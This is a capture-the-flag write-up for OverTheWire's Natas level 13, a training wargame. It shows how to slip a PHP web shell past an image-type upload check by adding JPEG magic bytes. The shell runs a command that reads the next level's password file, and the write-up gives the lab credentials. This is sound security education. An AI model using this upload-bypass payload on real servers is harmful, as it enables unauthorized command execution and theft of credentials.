# [natas 13](http://natas13.natas.labs.overthewire.org)

    Username: natas13
    Password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

This new challenge check whether the file is an image using function "exif_imagetype" before receive it.
So we create the file with command below to make it looking like an image.

    echo -e '\xff\xd8\xff\xe0<?passthru("cat /etc/natas_webpass/natas14");?>' > Trojan.php

Then do the same as previous challenge.

    Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

